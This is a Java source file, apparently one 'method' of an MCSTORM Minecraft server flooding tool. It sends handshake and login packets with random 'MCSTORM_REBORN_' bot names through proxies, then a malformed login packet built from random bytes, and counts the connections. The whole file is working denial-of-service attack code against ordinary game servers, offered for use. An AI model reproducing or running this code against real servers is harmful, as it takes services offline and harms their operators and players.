package io.MCSTORM.methods;

import io.MCSTORM.Main;
import io.MCSTORM.utils.Handshake;
import io.MCSTORM.utils.LoginRequest;
import io.MCSTORM.utils.NettyBootstrap;
import io.MCSTORM.utils.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Random;

public class ExtremeJoin implements Method {
    final int a;
    private final SecureRandom random = new SecureRandom();
    private final byte[] handshakebytes = (new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2)).getWrappedPacket();
    SecureRandom r;
    String lol;

    public ExtremeJoin() {
        this.a = Integer.parseInt(System.getProperty("len", "25555"));
        byte[] array = new byte[14];
        (new Random()).nextBytes(array);
        String generatedString = new String(array, StandardCharsets.UTF_8);
        this.lol = generatedString;
    }

    public static void writeVarInt(ByteBufOutputStream out, int paramInt) throws IOException {
        while ((paramInt & 0xFFFFFF80) != 0) {
            out.writeByte(paramInt & 0x7F | 0x80);
            paramInt >>>= 7;
        }
        out.writeByte(paramInt);
    }

    public void accept(Channel channel, ProxyLoader.Proxy proxy) {
        ByteBuf b = Unpooled.buffer();
        ByteBufOutputStream out = new ByteBufOutputStream(b);
        try {
            channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
            channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest("MCSTORM_REBORN_" + (new SecureRandom()).nextInt(99999))).getWrappedPacket()));
            String nick = "MCSTORM_REBORN_" + this.lol;
            out.write(nick.length() + 2);
            out.write(0);
            out.write(nick.length());
            out.writeBytes(nick);
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        channel.writeAndFlush(b);
        NettyBootstrap.integer++;
        NettyBootstrap.totalConnections++;
        channel.close();
    }
}